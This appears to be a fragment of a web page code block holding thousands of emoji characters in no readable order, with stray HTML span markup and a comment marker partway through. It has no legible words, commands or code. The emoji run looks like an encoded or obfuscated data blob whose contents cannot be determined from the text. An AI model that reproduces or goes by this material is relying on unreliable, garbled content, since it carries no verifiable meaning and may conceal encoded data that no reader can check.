👟👆👍👤🐬🐺👛👣👐👯👑🐿👛👊👄👍👍🐫👍🐨👟👦👐👍👅🐾👎👣👑👑👎🐿🐹👱👍👢👑👪👚👣👧🐼👋👢🐬👎👙🐿🐹👁👎👣👍👘👐👍👈👯👎👏👛👏👘🐩👯👎👋👎🐬👊👘🐽👣👏👜🐼👫👏👉👣👑👱👎👢👑👎👍🐧🐧👮👊👢👣👏👘🐩👈🐧👎👍👛👊👉👢🐨👎👎👤👫👊👙🐼👧👌👎👎👫👘👛🐧🐬👪👎👥👅👘👉🐽👁👘👍👤👯👂👜👣👌👰👅👍👛👍👙👌👧👐👐👌👑👪👎👤🐼👯👚🐻👅👑👄👥👟👟👐🐨👑👂👚👢🐰👎👋👢🐬👎👍🐽👍🐫👍👤👯👡👜🐼🐨🐾👍👏👣👊👘👣👧👏👐👤🐨👊👎🐽👑👬👚🐼👁👣👉👣👑👐👐👱👅👦👍🐧🐨👏👌👣👧👑👍👍👧👭👐👍👑👁👜🐽👅👫👘🐽👛👠👎🐼👁🐼👍👤👧🐹👄👍👀👯👑🐿👅👟👉👋👣👏👐👏👧👎👎🐽👑🐾👑🐻🐹👢👄👣👑👏👍👎🐬👆👎🐾👁👩👅👍👣👑👙🐽👑👏👋👢👑👩👛🐨👧🐿👆👍👛👅👉🐼👑👀👎👋🐹👦👛🐨👐👰👊👢👛👡👉👢👁👘👑👎👫👘👌🐽👢👰👚👱🐽👎👄👍👁🐧👐👢👑👆👘👍👛🐾👉👏👟👎👙👋🐼🐧👐👎🐨👎👉👢🐨👍👎👢🐬👎👍🐩👟👌👎👎🐨🐧👛🐨👈👯👎👥👉👅👍🐽👁👎👋👍👛🐫👍👣👑🐿👛🐼🐰👏👉👢👧🐧👑👌👟👮👎👣👑👏👋👋🐽👎👘👢👑👃👑🐼👛👎👉🐩🐽🐾👑🐼🐬👠👙🐼👐👱👍🐨👑👢👜👤👍🐿👋👥👁👆👍👣👧👦👌👤🐬🐺👙🐨👉👎👘🐼👅👅👙🐽👧🐧👐🐧👍👂👘🐧🐨👪👎👢👟👎👉👱👍🐿👍👢👛👂👊🐽👍👪👘🐽👧👟👄👍👦👱👍👎👫👘👐👍👀👯👑🐿👉👢👉👣👑👧👍👤👯👮👊👍👛👌👈👣👛👡👄👍👧👀👌🐩👯👦👘🐽👁👪👊👣👑👎👘🐨👑🐪👑🐾👯👘👚🐨👛👫👉👣👅👅👍👥🐸👮👍👎🐧👯👄🐽👉👫👉👏👟👡👉👎👯👏👐👎👫👩👜🐽👑👌👉👣👅👡👄👍👁👰👐👌👛👦👌🐩👁👎👊👣👛👎👙👋🐼🐧👎👍👛👎👚🐨👍👬👊👣👟👠👍👍👧👑👍👎👯👊👍🐨👐👯👌👏👟👏👙👋👣👎👋👌👉🐾👊👣👍👏👜🐾🐰👎👄👢👑👰👐👥👧🐺👎👣👑🐽👎👤👟👘👉👍👧👇👐👱👁👂👊🐾🐽🐾👋👣👅👎👉👣👧👐👍👤🐧👯👅🐽👣👏👌👏👣👊👘🐩👉👐👍🐧👛👊👎🐽👑👩👍👤🐽👏👉👤👯👰👍🐩👫🐧👙🐾👁🐿👌👥👣👎👙🐽👁🐿👐👌👑👂👍👍🐽👨👋👣👑👅👙👣🐽🐪👍👤👧🐹👜🐽👐👰👋👢👛👟👉👤👉👦👐👋🐽👮👎🐽👛👪👍👤🐽👟👄👢🐨🐬👌👤👫👢👍👤👁👏👘🐼🐰👑👘🐨👑🐪👋👢👑👘👚🐨👧👀👑🐽👉👅👘🐩👮🐧👍👡🐽👦👙🐨👑👫👊👢👛👡👉🐩👟👎👐👣👟👅👜🐽👐👯👎👣👛👢👉🐨👑🐿👎👢👌🐨👋👣👑👫👛👱🐽👏👘🐨👑👋👌👋👁🐾👉👢🐨👎👎👤👣👊👉👋👍👎👎👎👫👘👐👎👅👪👎👥👅👘👉👏👉👋👋👎👪🐨👊👣👌👰👜🐾👫👍👄🐻🐹🐬👐👌👚🐬👍🐩🐽👩👊👥👁👎👍👱🐽👏👑🐼👑👊👚👣👧🐿👉👣👅👅👙👤👟👘👍👣👛👮👊🐩👀👯👎👥👅👏👙👢🐬👦👌🐧👛👊👌🐨👣👪👎👤🐽👋👉👣👧👀👑🐼👛🐧👍🐨👐👮👚🐼👣👘👍👎👟🐻👍👤🐨👂👎👍👉👐👘🐽👧👟👘🐨👧👌👍👡🐹👢👍🐨👁👫👌👢👛👘👉🐩👯👋👋👍👍👮👐👍👑👩👎👤🐽👠👄👣🐽🐫👍👎🐬👆👎🐾👁👩👅👏🐽👍👙👋🐽👭👎👍👑👪👍👍👅👫👆👍👑👊👙🐿🐹🐫👍👋👁🐧👄🐽👐👰👊👢👟👍👙👥🐹👘👍👣👑👮👄🐨👣👍👍👏👟👏👍👢👑👑👐🐧👑👢👌🐩👁🐾👚🐾🐰👏👘🐨👁🐿👎👍👛👊👉🐨👅👬👊👤👟👊👄🐨👁👌👎👎👫👘👛🐩👉👪👑🐿👅👘👉🐼👁👘👍👤🐨👊👜👣👛👩👘🐼🐰👎👄👢👧👎👍🐩🐧🐬👍👍👑👪👚🐿👧👌👍🐼👑👋👍👡👁🐾👉👣👧🐾👑🐼🐬👟👄🐧👀🐨👍🐨👉🐺👐👎👀👯👎👏👣👊👎🐾👟👐👐👎👪🐨👎🐽👍👪👎👥👛👎👄👏🐹👎👍🐩🐨🐧👘👤👁👀👈👢👣👑👄🐾👉👱👍👢👑👂👍👤👅🐽👚🐽👛👠👍🐼👀🐧👎👣👛👱👜🐽👐👯👑🐽👣👠👉👣👁👦👋👎👯👂👎👍👛👎👑🐻👉👋👄👎👉🐿👍👎👯👢👎🐾👁👫👌👤🐰👍👙👋🐽👋👍🐧👑👑👜👎👅🐭👉👤👣👊👘🐪🐸👯👍👍👛🐧👙🐨👛🐿👉👏👟👡👉👢👁👘👍👤🐨👊👉🐨👧👍👑🐼🐰👊👄👢🐬🐿👐👌👑👢👋👢🐨👍👚🐻👍👎👄👎👉🐪👌👡👁🐽👜🐽👅👐👙🐽👉👟👄👥👟👍👎👎👫👢👙🐩👅🐾👙🐿👅👏👘🐪👉👪👐👢👑👮👄🐽👉👍👘🐾🐰👎👘👱🐽👐👍👎🐬👮👎👣👑🐽👅👏👁👎👘👢👧👃👍🐨👑👎👚🐩🐽🐾👍👣👛👅👄👌👣🐭👍👤👧🐺👐👍👐👰👌👢👟👌👘🐨👧👈👍👤🐨👊👎🐽👣👩👘🐼👅👆👙🐾👉👍👌👎🐧🐬👍🐼🐨👎👙🐻👅👌👍👣👑👭👍👤🐨🐽👜👤🐽🐾👘🐽👍👎👍🐨👁👌👍👡🐹👘👍👤👍🐾👑🐿👅👌👙👏🐹👆👐👏👧👎👊👍👐👰👛🐾🐽👌👄👍👣🐬👌🐩👯👎👘🐾👍👩👚🐽👟👑👙🐽👁🐿👋👋🐽👎👚👍👁👬👋👣👟👊👘🐪🐹👘👎👍👍👢👉🐨👌👯👎👏👣👟👉👤👯👐👍👤👯👂👋🐽👣👨👉👣👛👎👄👎👉🐨👍👎🐨🐧👍🐽👀👯👊👣👛👎👉👣👧👟👑🐻🐸👯👉🐩👅🐽👎👤👟👊👄🐨👁👐👍👎🐨🐫👛🐩👍👪👘🐪👛👟👊🐾👉👐👌👡🐹👎👅🐽👌👰👜🐽👅👎👄🐻🐽🐨👐👌👛👦👐👍👁👏👌👣👟👍👘👢👧🐿👌👡🐽👢👚👢🐬👏👙🐾👣👎👄👤👚👯👍👤👧🐾👐👎🐼👮👅👌👛👍👎🐾👟👌👐👤👫👮👌🐽👑👫👄👍👅👟👉👣👑🐧👋👣👍👆👘👣👁👪👎👡🐹👘👉👎👟👩👍👢👑👘👚🐩👅🐼👈👤🐽👊👍🐨👁👀👍👡🐹👢👊🐨👐👯👑🐿👅👠👉👤👉👧👍🐧👑👂👅👣👑👫👜🐾👫👋👄👎👉👏👌👤🐬👎👌👤👁🐾👚🐾🐰👑👍🐼👑🐪👍🐽👑👘👊🐼🐨👌👌👣👧👎👄🐻👍🐭👎👍👉👆👛🐩🐽🐾👊👏👣👣👉👋👣👏👐👣👟👦👐👍👉👍👎👤🐽👡👍👢🐬👯👌👎👯👮👍🐩👁👎👊👢👧👎👍👱🐸👯👍🐻👁🐾👚🐨👅👬👌👤👟👊👙👎👟👟👍👤👫👎👐👎🐽🐾👚🐽👛👏👙👤👉👏👐👢👛👊👄👍👑🐿👄👏👛👎👄👢👍🐭👌👎👧👘👎🐽👑🐽👊👥👁👌👘🐨👧👎👑👍👑👆👚🐨👧🐾👌👤👣👎👍👥🐹👘👍👤🐨🐧👍🐨👄👰👋👥👅👠👊🐼👑👋👐👢👑👮👚👣👉👍👌👢👛👏👙🐽👧👐👋👍👚🐬👍👢🐨👪👎👡🐹👘👍👍👧👱👍👡👁👂👎👍🐽👪👈👣👛👎👉👍👧👰👍👎👧🐾👛🐨👀👯👚🐼👛👟👉🐩👯👦👑👎👯👘👎👣👑👩👎👤👫👣👘👱🐽👏👍🐾👫👢👎🐽👛🐿👜🐿👅👍👙👥🐹👱👐👡🐽👘👛🐼🐨👎👋👣👉👊👙🐽👐🐨👍🐾👯👦👋🐨👐👮👄👏👁👡👉👣👧👎👐👢👑👂👉🐽👐👮👎👤🐽👡👄👍👧👯👍👎👯👘👘🐾🐼👱👈👣🐽👎👍🐪🐹🐿👐👋👁👅👜👍👁👩👘🐾👟👊👄🐩👟👮👍👡🐹👢👙🐩🐽🐾👎👥👉👣👉🐪🐹👪👌👣👉🐾👊👍👑👎👘🐿👅👎👄👢👧👀👍👎🐧🐬👍👍👑🐽👚🐽👉👎👄👍👧👱👑🐼👌👯👍🐨👉👪👘🐽👅👠👉👏🐹👘👍🐩👫👎👐👎🐼👯👌👏👟👋👙👣👁👩👌👢👌🐨👎👍👣👌👊👢🐬👅👍👣👣🐪👍🐩👫🐧👘👢🐨👩👅👌👧👑👄🐽👧🐪👍🐾👯👁👜👍👦👱👚🐽👛👠👎🐼👁👄👍👎👧👂👋🐩👄👯👚🐼👣👌👙🐽👧👧👌🐧👍👂👌🐽👛👏👄🐿👟👠👙👍👑👱👍🐩👯👦👘👣👁👏👌👥👁👌👍👣👌👯👌🐨👑👍👜👎👉🐿👆👎👟👊👘🐩👮🐩👎👍👍👦👈🐨👑👫👊👣👍👎👘🐨👁👐👍👤👯👮👘🐽👧🐽👑🐼🐰👊👙🐿🐹👀👐👌👛👪👍🐩👁👀👈👢👫👎👙👋🐹🐪👋👍👑👅👜🐽👍👬👋👣👟👠👙🐼👧👏👎👎👫👢👅🐽👛🐾👌👣👑👘👉👢🐬👩👐👢👑👪👅🐽👐👰👅👌🐰👟👄👌👣🐫👍🐩👫👢👐👍👁👏👌👡👅👎👉🐪👟👟👐👱👁👆👉👍👍👪👑🐽👛👠👍👋👈👮👍👣👛👮👉🐩🐼👯👊👏👟👌👙👣👑👎👐👣👟👦👍👍👍👨👋👤🐰👏👍👣👧🐿👎👏👧🐾👍👤👁👎👉👡👉👎👄👡👍🐿👍👎👯👢👊🐾🐽🐾👘🐽👍👎👄🐧🐨🐫👍👋🐹👘👚🐩👅👪👑🐿👅👘👉🐩👟👏👐👋👅🐺👅👣👛👏👛🐽👅👌👄👍👣🐬👌🐩👯👎👌🐨👑🐽👊👣👣👎👙👋🐽👋👍🐻🐽👮👍👣👛👬👑🐽👉👎👙🐼👧🐭👎👍👍👢👚🐨👌👰👊👢👣👉👙🐿🐹👏👐👣👉🐺👅🐽👉👍👑🐽👁👢👄🐻👍👏👎👢👑👦👘👍👁👬👈👣👧👏👍👣👁🐿👑🐻🐽👎👍🐨👛👬👌👤👫👊👎🐽👁👏👍🐽👑👘👐👍👅🐾👎👣👛👟👉🐪👉👎👍👤👯👘👍👣👉👍👌👥👁👈👌👋🐧🐰"</span></span><br><span class="line"><span class="comment">#👍👤🐧👮👛🐩👈👰👌👏👣👍👎🐾👯👎👍🐧👛🐫👍🐨👐👮👑🐻👉👎👄👍👣🐪👎👢👉👊👍🐧🐨👎👙🐻👅👏👘🐨👁👋👍👡🐸👯👍🐩👁🐼👋👣👟👟👄👌👧👌👍👤👧🐹👜🐽👐👰👊👢👍👌👙🐾👟👦👋👍👍👮👍👍👑👫👚🐼👁👣👉👣👣🐬👌🐩👫👎👍👎👁🐿👘🐾🐰👌👍👣👑🐪👍👣👑👘👚👍🐽👫👉👣👉👅👙🐼👧👁👍👤🐨🐧👘🐨👛🐿👊👢👛👡👉👋👣👘👍👡👅👊👉🐨👧👍👎👤🐽👢👉🐧🐬🐾👌🐩🐨🐫👌🐩👁🐿👛👱🐽👎👍🐼👦👮👍👡🐽👘👎🐽👅👩👘🐾👟👊👜👤👯👎👍👤👧👆👋🐧🐧👯👚🐽👑👏👙👌👑👩👌👡🐸🐨👉🐨👧🐽👎👣👅👌👙🐽👧👍👍👤👫👮👍🐩👁👌👉👏👛👎👘👢👑👏👑🐼👑👆 👚🐨👛👪👘🐾👣👊👄👤👟👑👍🐨👛🐫👙🐩👀👰👍👥👅👍👙🐽👑👋👐👣👍👘👚👍👑👫👛🐾🐽👅👉👣👑🐧👑👌👑👆👍👎👁👍👚🐼👛👑👄🐽👑🐪 👍👡👁👂👍👍👁👐👑🐽👧👎👉👍👧👰👍👋🐹👘👋🐩👅👪👚🐼👟👡👉👣👁👋👍👣👟🐺👎👣👐👯👎👣👅👊👄👣🐽🐬👌👤👫👢👘👣👁👫👌👣👣👑👙🐽👑👟👐🐩👯👎👚🐨👍👩👑🐽👛👠👉👥🐹👑👎👣👍👘👋🐨👑👏👊👣👑👏👍🐼👧👎👐👢👑👂👊🐽👑👨👊👢👑👣👍👣👑👑👎👢👑👮👙🐾🐼👱👈👢👣👏👎🐿🐹🐿👍🐻👁👊👍🐨👑👬👌👤👟👊👘👱👍👱👎👎👯👦👙🐨👛🐾👎👥👉👅👊🐾👉👪👌👡🐹👪👅🐽👌👰👛🐾👫👏👉🐧👧👀👍👎👯👪👎👤👁🐾👎👤👟👑👄👍👧👟👑🐼👛👊👊🐽👁👩👅👍👅👠👉👤🐰🐪👍🐩👯👎👐👍👈👯👎👣👟👋👙🐽👧👐👍👢👍👮👍🐨👣👩👎👢👫👋👉👣👧👯👌👤🐨🐾 👌🐩👁👍👙🐻👑👏👘🐨👧👩👐👌👛🐽👜🐾👅🐿👆👍👛👟👘🐧👧👦👍👢👉👂👋🐩👉🐾👊👥👁👟👉🐩👟👋👐👏👧👎👜👣👛👏👜🐾🐰👠👄👎👉🐿👍🐩🐬👊👋👣👛🐿👌👣👑👌👍👣👧🐿👋👋🐽👊👍👤🐽🐿👆👎👟👠👉👏🐹🐭👎👋🐹👘👚🐨👛👫👊👢👛👏👙👎👟👘👋👎🐬👦👎🐽👢👯👎👢👛👎👍👢👧 👱👍🐾👪🐨👍🐧🐨👍👙👱🐽👎👙👏🐹👃👋👢👑👉👜🐽👛👪👘🐽👉👠👉👥🐹👯👍👎👯👢👌🐨👣👎👌👣👑👏👙👌👑👆👋👍👑👮👜🐽👌👰👛🐻🐹👎👄👍👧👰👐🐧👑👮👎🐾🐼👯👚🐿👁👑👍👎👉🐾👑👌👛👆👉🐩👁🐾👘🐾👟👅👍👥🐹👭👍👤👫👊👊🐨👉👫👍👢👛👡👉👎👯👍👐👣👛👦👍🐽👉👏 👅👎🐰👎👍👤👉👏👍👎👪🐬👌👢🐨👏👌👥👧👎👄👎👟👭👍🐧👛👂👎👍👍👩👆👍👑👟👘🐨👧👀👍🐾👯👘👐👍👛🐽👅👍👑👇👍🐩👟👧👌👣👟🐹👛🐨👑👪👑🐻👉👡👄👎👉🐧👌🐩👫👢👎🐾👁👏👘🐾🐽👌👍👱👍👭👍🐧👑👩👜🐽👛👩👛🐾👫👊👘🐪🐹🐭👍👣👛🐫👋🐩🐽👎👊👏👧👑👄🐩👟👏 👐👋🐽👮👘🐽👑👌👉👣👑👣👉👤👉🐨👌🐩👪🐨👎🐽👁👐👈👥👟👎👍🐪👟👩👋👢👛🐾👉🐨👑👐👑🐾👟👊👍👋👍👌👍👎🐨🐫👛🐩👍🐾👍👏👣👢 👉🐪👉👦👐👣👍👮👍🐨👑👫👚🐾🐽👏👙🐽👧👏👐🐧👛👦👎👣👑👏👌👢👛👘👍👎👉👇👌🐧👌🐬👍🐨👧🐿👘🐾👟👅👊🐼👁🐩👍👤🐨🐧👌🐨👄👯👌👏👣👍👘🐩👉👌👐👤👫👮👙🐨👍👨👊👤🐰👎👉👤👯👑👐🐧👑👢👙🐾👁🐿👌👣👣👘👍👎👄🐨👐👍👌👯👎🐽👍👩👘🐽👛👅👘👣👑👌👍👢👛🐫👋🐨👅🐿👉👢👛👉👙🐽👧👧👍👢👍👍👛🐨👑👫👚🐼👛👍👄👍👧🐧👌👤👫👦👌🐽👑👫👘🐽👉👌👍👎👟🐻👋👣👑👘👊🐾👍🐿👉👤👧👅👍🐨👀👮👍👋👁 🐧👘🐨👛🐿👊👣👟👟👉🐧👑👍👍👥👧👎👛👣👐👮👎👥👁👣👉👤👉👰👎👢👑👢👍🐩🐼👱👈👡👑👎👘🐩👉🐭👋👍👑👢👉🐨👅👪👎👤👧👊👍🐪👟👐👎👎👯👦👈🐨👉🐾👌👥👁👏👙🐼👧👪👌👤🐨👊👜👣👣👍👎👣👅👟👉👋🐽👱👌🐩🐬👦👍🐨👑🐭👉👋🐹👘👉🐼👑👩👌👡👁👂👊👍👉👫👘🐽👅👟👜👣👑👈👍👢👑👘👐👎👈👰👍👢👛👎👎🐾👯👩👌👢👍👂👎🐽👉👎👎👥👛👣👍👤👫🐪👍🐩🐬👢👎🐽👀👮👍👡👉👑👄🐽👁👇👍🐩🐨🐽👜👍👍👩👑 🐾🐽👎👄🐩👟👀👎👋👀👯👊🐨👀👯👚🐼👟👠👉👤👟👋👍👣👟🐺👊🐨👑👫👄👋🐹👍👄👌🐨🐫👍👣👟👦👎🐽👛🐿👘🐽👣👑👙👏👟👟👍👡🐽👪👚 🐨👧🐿👆👍👛👊👙👏👟👘👎👋🐹👘👘🐩👁🐿👊👢👟👍👙🐾👯👟👍👣👛👅👄👍👣👎👍👏👟👏👉👣👑👰👐👌👑👢👋👤🐽👪👎👣👍👎👘🐩👈🐧👍🐻 🐽👆👊🐽👁👩👑🐽👁👠👉👥🐹👮👍👤👫👎👍👤👈👯👎👥👉👡👉👎👉👎👋👍👑👮👄🐽👍👫👛🐾🐰👍👉👣👧🐧👐👌👑👊👍👍👑👏👘🐼👉👌👙🐽👧👟👌🐧👛👎👊🐽👁👫👚🐼🐬👎👄👌👣🐪👍👣👉👂👄🐾🐼👯👑🐼👟👋👙🐾👟👦👌👡🐹👘👍👣👑👬👚🐽👛👢👙🐽👣🐪👍🐩🐬👂👙🐽👁👫👌👥👣👏👘🐨👧👩👍👡👁🐽👜👣🐽👨👎👣👛👟👄👣👀🐩👍🐽👑👘👎👤👈👮👄👍👛👏👙👎👯👪👐👋🐽👮👎👍👛👏👜🐾🐰👉👄👍👁🐿👍👎🐬👂👎🐾👁🐽👚🐿 👅👍👙👋🐽👋👑👎👯👪👍👣👛👪👋👤👟👎👘🐪🐸👯👍👍👛🐫👛🐨👐👰👊👣👣👍👙🐾👟👟👌👢👍👘👐👍👧👍👑🐼👫👋👍👢🐬👱👐👌👛👦👋👢🐨👍👚🐽👛👎👙🐾👅🐫👋👢👛👉👜👍👑👩👑🐽👛👠👙🐼👧👇👍👤👯👢👌🐨👐👯👌👣👟👢👊🐾👉👏👋👍👛🐫👜👍👑👏👄👌👛👏👉👢👣🐪👍👤👧👊👎👢🐨🐿👘🐼👯👎👄👥👟👟👍🐧👑👎👚👣👧🐿👉👣👛👎👄👌👧👉👍👣👉🐺👍👢🐬👎👎👏👟👡👉👎👟👦👌👡👁👦👋🐨👌👮👍👢👫👅👙🐽👧 🐧👋👍👉🐺👍👢🐨👍👄👋👉👎👍👤👟👱👍👤🐨🐽👜👍👍👪👍👣👧👠👎🐽👀👱👎👎👧🐾👍🐩👅👎👋👥👉👇👍👤👉👋👐👣👟👦👐👍👛👌👈👤🐽👟👄👢👧👀👌🐩👫👦👍👤👁🐿👜🐾👟👎👙🐾👉👆👋👍👑👪👍🐨👑👐👘🐽👟👊👙🐽👧🐬👎👍👍👘👘🐨👉👫👉👥👅👏👙🐽👑👏👐👋👁👉👄🐽👣👌 👉👢🐰👊👄👍👧🐨👍🐾👯👦👘👍👁👪👚🐽👣👏👍🐪👉👭👌👋🐽👆👍🐨👛👩👑🐽👑👟👄👣👁👏👍🐽👑👘👛🐧🐨🐾👍👥👉👢👉👱👣👎👌👤👯👪👅👍👣👍👘🐼👅👎👙👌👧👀👐👌👍👊👍👎👁👐👘🐿👁👎👙🐽👧🐿👑🐼👑👂👛🐾👅🐽👅👍👛👅👍👎👮👱👍👤👯👊👊🐧🐨🐿👉👏👟👘👉👎👟👌👐👢👛 👦👙🐨👍👨👈👤🐽👎👙🐽👧🐨👐🐧👑👢👘🐩👁🐾👙🐻👅👎👄👡👍👇👍🐻👁👂👉👤👅👀👚🐽👟👟👄👣👀👱👎👍👑👘👋🐨👁👪👋👥👁👠👉👤👉👆👐👤👯👂👜👍👛👐👚🐼👛👎👙👍👑👏👍🐾🐬👎👍🐾👁🐾👊👥🐹👎👙🐽👧🐪👍🐨👑👘👉🐨👣🐭👉👤👣👅👍🐨👁👀👍🐩👫👘👘🐨👛🐿👊👢👑👡👊🐼 🐬👎👐👣👉🐾👍🐽👧👏👜🐿👅👎👙🐾👉👱👍🐾🐨👦👍🐩🐼👱👈👏👟👎👍👤👈🐧👑🐻🐽👑👜👍👅👪👙🐽👑👠👉🐩👟👦👍👎👫👎👐👍👣👎👚🐽 👑👘👉👏👉👌👍👤👪🐨👜👣👣👍👑🐾🐰👌👘👱🐽👎👐🐧👑👘👍🐩👁🐿👋👡👉👌👘🐩👉👊👑👍👑👘👚👣👧🐾👑🐾👣👊👄👌👧🐩👍👣👚🐨👛🐩👄👰👊👏👟👍👙🐾👉👐👐👤🐨👊👚🐨👣👩👎👥👅👆👍👤👫🐪👍👤🐨🐧👍🐧🐨🐼👉👢👑👍👙👏🐹🐿👍🐩👯👘👎🐽👍👬👎👣👛👅👙👤👟👦👍👡🐹 👘👍🐩👅👪👚🐼👟👊👙🐾👉👏👋👍👍👮👌👣👑👪👑🐿👛👋👄👌👣🐫👌🐨👟👪👌🐩🐼👰👘🐿🐹👍👙👏👄👯👐🐧👑👪👍👍🐽👬👑🐼🐬👠👉👥🐸👮👍🐽👑👊👈🐨👑👩👄👍👑👅👍🐽👁👏👍👤🐨👦👜👣👑👫👄👌👑👣👍👣👑👱👍🐩👯👮👘👍👛🐾👊👏👧👏👍👣👑👟👍👡👁👊👊🐽👑👩👎👤👫👊👄🐧👁👌👎👎👫👦👈🐧🐬🐾👎👣👍👋👎🐾👉👇👍👡🐹👮👊👍👌👰👛🐾🐰👎👙👌👧👀👑👌👛👦👍🐩👁🐿👌👢🐰👌👍👣👧👱👍👡🐽👘👎👎🐽🐾👘🐽 👅👠👉👥🐸🐩👍🐨👑👎👐👎🐼👯👌👥👅👏👎🐾👯👦👌👢👍👮👎🐽👉👎👎👥👛👟👉👣👐🐩👌👤👫👮👙🐽👁👪👊👡🐽👎👙👏👟👃👐👍👑👂👚🐩 👅🐾👙🐽👛👊👙🐼👧👀👍👏👧🐹👄👎👄👯👑🐿👁👘👉👣👧👦👋👎👯👂👎🐽👑🐾👎👤🐽👢👄🐻🐽🐿👍👤🐬👊👘🐨👁🐭👙🐽👛👍👙👏👟👱👋👣👑👪👍👤🐽🐽👋👣👛👠👍👏🐹👁👎👍👍👎👋🐨👣👎👊👢👑👏👙👎👟👘👑👎👫👘👄🐨👍👪👎👣👛👢👉🐧🐬🐾👋👣👑👢👋👣👑👏👛🐪👧👎👙👏👟👋 👌👱🐸👯👊🐽👁👐👘🐾🐽👊👍🐩👟👍👎👎👫👢👙🐩👀👯👍👥🐽👉👙👌👑👏👐👢👑👮👄🐽👧👍👘🐾👫👌👘👱🐽👑👌👎👯👪👐👍👑👏👘🐼👯👑 👘🐨👧👘👑👌👑👢👚👤👁🐿👉👣👅👎👄👌👐👱👍👤👯👊👊🐨👁👫👍👥👅👊👙🐾👯👟👌👤🐨👦👚🐽👍👫👜🐿👛👠👄👎👉👏👍👎👫🐧👌🐧🐨👎👙🐻👉👏👘🐩👟👏👍👢👛👂👎🐾👍👀👋👣👧👎👉👍👦👱👍👡🐽👘👘🐨👛🐿👍👢👟👇👍👢👧👆👍👣👉🐽👄🐽👑👪👑🐻👉👟👄👎👯👏👌🐩👯👢👘👣 👅🐽👅👍👛👑👙🐽👁🐿👍👢👑👑👜👎👍🐿👛🐾👧👠👉👥🐹👎👍👎🐨🐫👘🐨👉👪👎👥👍👉👘👣👧👐👍👢👍👂👘🐽👑👨👉👤👫👊👄👎👉🐨👍🐾👯 👊👘🐼🐨👫👘🐾🐰👎👍🐪👉👏👎👍👑👪👍🐩👅🐾👎👤🐽👊👎🐽👁👍👍👤🐨👱👄👎👍👪👙🐽👑👘👉👱👣👍👐👏👧🐾👍🐨👢👮👎👤🐽👎👄👢👧 👀👍🐾👧👊👍👎🐼👰👌👣👅👘👍👣👧👟👐🐩👯👮👉🐨👧🐾👘🐽👅👅👄👤👞🐨👍👤👯👢👛🐨🐼👯👙🐽👟👌👘🐩👉👏👐👤👯👂👚🐨👌👮👑🐽👅👡👄👎👯👰👍🐩👯👢👋🐨👑👬👈👣👛👑👍👎👈👮👍🐧👑👁👛🐩👅🐽👘🐽👧👅👉👥🐹🐩👍👡👁👱👜🐽👅🐿👉👢👑👣👉👤👉👦👐👋🐽👮👙🐨👑👏 👄👋👉👟👄👢🐬🐧👍👤👫👢👐👍👁👌👍👣👟👑👙👏👉👃👌🐩👯👑👜🐽👍👩👚🐾👯👊👘👱🐼🐧👍👋🐽👦👙🐩🐽👪👊👣👟👟👊🐼👁👎👐👣👉🐾👛👣👑👩👎👤🐽👡👄👢👑🐾👍🐾👯👊👋👣👑👬👈👏👛👎👉👣👧👋👌👋🐽👘👚👢🐨👎👎👢🐬👎👉👢👧👐👎👎👫👢👙🐩👉👪👎👏👛👏👙👏👉👌👌👡🐹👘👊👍👣👍👎👤🐽👌👙🐼👧🐨👌👎🐧🐬👍🐩👁👌👉👋🐹👑👜👢👧👇👐👱🐽👮👊👍👅👫👛🐽👅👅👄🐼👧👍👍🐨👛🐧👙🐨🐼👮👅👌👛👏👙 🐽👑👌👍🐧👛👊👌🐽👑👨👈👥👛👋👍👣👍🐬👑🐼👚🐬👍🐩👁👍👚🐼👣👘👍👎👉👭👍👡👁👂👊🐽👍👩👆👍👍👎👙🐿🐹🐭👍👤👧🐾👐👍👛👏👉👢 👛👟👉👢🐬👧👌👤🐬🐹👄👣👐👯👎👣👛👑👍🐧👍🐫👍👎🐬👆👎🐽👛🐿👜🐾🐰👍👘🐨👑🐪👍🐧👑👊👍🐨👛👬👑🐾👟👊👙🐽👢👰👍👎🐨🐧👛🐩👁🐾👊👥👅👋👘👢👑👏👌👥👧🐾👊🐽👑👌👊👢👫👊👄👢🐬🐿👐👢👑👦👍🐧🐧👯👊👡👁👎👍👣👁🐺👋👍👛👅👜🐽👧👀👊👤👟👊👄🐨👁👌👍🐽👍👘👛🐨👛👎👑🐽👟👣👉🐧👑👘👍👤🐨👊👎🐽👐👰👜🐾🐰👟👄👌👦🐩👐👢👚🐬👍👍👑👪👎👥👧👌👙🐽👧👱👍👤🐨🐾👉👣👉👪👑🐾👣👎👎🐼👁👂👍 🐨👑👎👍🐨👈👯👙🐽👛👋👘🐨👧👐👐👣👛👦👐👍👧👏👛🐾🐽👅👄👍👑👱👍🐩👯👢👘🐨👀👮👅👌👛👌👙🐽👧👩👍🐾👯👘👎🐾👈👱👚🐽👛👠👎🐾👟👌👍👏👧🐹👜🐽👅🐾👋👣👣👠👉👢🐬👦👋👎👯👂👍👣👛👏👄👏👧👅👍👣👧👏👐👢👟👂👐👍👁🐭👙🐽👟👑👘🐨👧🐪👑👎👯👑👜👌🐬👏👛 🐽👍👟👜👢👑👐👎👋🐹👦👚🐨👐👮👄👏🐽👊👘🐩👟👘👍👡👅👦👘🐽👢👰👄👌🐰👊👍👢👑🐧👌👤👯👆👍🐧🐨👍👎👏👧👎👙👏👟👋👌👱🐽👂👛🐽👑👬👋👣👅👠👉🐪👟👦👍👎🐧👯👙🐩👅🐾👍👥👉👣👊🐾👉👧👋👍👛👊👎🐽👑👏👛🐻🐹👍👄🐻🐽👏👐👢👉👊👍🐨👁🐭👍👣👟👎👙🐾👉👃👍 🐧👛🐾👉👢🐰👎👍👣👛👣👘🐨👦👰👍👤👧🐾👐👎🐼👯👎👏👟👎👙👢👧👟👌👡👅👊👋🐨👣👌👉👥👛👋👍👣👧👯👌🐩👧👊👍🐧🐨👎👍👡👍👍👄👥👉👩👐👎👯👆👉👢🐬👎👑🐽👧👠👉👢👧👀👍👤👫👘👌🐨👐👯👑🐿👅👏👙👏👟👏👋👌👉👉👜👍👑👏👄👋👉👠👄👍👍🐬👌👣👟👮👌👤👁👍👎👣👟👎👙👋🐽👊👋👌👑👪👅👣👁👫👛🐽👅👅👍🐨👀👯👍👣👛🐫👐👍👐👯👊👣👑👡👉👱👣👏👍👡👅👊👎🐽👛👎👎👥👅👎👄👢🐬🐿👍🐩👯👦👘👍👛🐾👊👥👣👎👙👋🐼👮👑🐻👁👎👚🐨👛👬👌👢🐬👏👉👋👍👐👍🐽👑👎👚🐧🐬👪👙🐽👑👍👙👌👑👏👋👌👉🐾👎👍👑👎👘🐾👫👏👉👣👧🐧👍👎👯 